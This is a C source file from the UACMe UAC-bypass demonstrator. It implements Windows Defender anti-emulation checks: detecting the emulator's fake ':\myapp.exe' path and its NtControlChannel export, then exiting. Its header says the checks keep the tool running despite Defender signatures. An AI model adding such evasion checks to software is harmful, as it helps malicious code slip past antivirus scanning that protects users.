/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2017
*
*  TITLE:       WINDEFEND.C
*
*  VERSION:     2.72
*
*  DATE:        25 May 2017
*
*  MSE / Windows Defender anti-emulation part.
*
*  Short FAQ:
*
*  Q: Why this module included in UACMe, 
*     I thought this is demonstrator tool not real malware?
*
*  A: WinDefender is a default AV software installed on every Windows
*     since Windows 8. Because some of the lazy malware authors copy-pasted
*     whole UACMe project in their crappiest malware WinDefender has
*     several signatures to detect UACMe and it components.
*     Example of WinDefend signature: Bampeass. We cannot be prevented by this
*     as this demonstrator must be running on newest Windows OS versions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* wdCheckEmulatedVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure
* API calls are transparent for scanned code. It also use simple Virtual File System
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
VOID wdCheckEmulatedVFS(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
        ExitProcess((UINT)0);
    }
}

typedef NTSTATUS(NTAPI* pfnNtControlChannel)(
    _In_ ULONG ControlCode,
    _In_ PVOID Data);

/*
* wdCheckEmulatedAPI
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it API artefact.
*
* This method was revealed by Google Project Zero
* https://bugs.chromium.org/p/project-zero/issues/detail?id=1260.
*
*/
VOID wdCheckEmulatedAPI(
    VOID
)
{
    HMODULE hNtdll;
    pfnNtControlChannel NtControlChannel = NULL;

    hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
    if (hNtdll) {
        NtControlChannel = (pfnNtControlChannel)GetProcAddress(hNtdll,
            "NtControlChannel");

        if (NtControlChannel != NULL) {
            ExitProcess((UINT)0);
        }
    }
    else {
        ExitProcess((UINT)-1);
    }
}

/*
* wdDummyWindowProc
*
* Purpose:
*
* Part of antiemulation, does nothing, serves as a window for ogl operations.
*
*/
LRESULT CALLBACK wdDummyWindowProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
)
{
    switch (uMsg) {
    case WM_CLOSE:
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
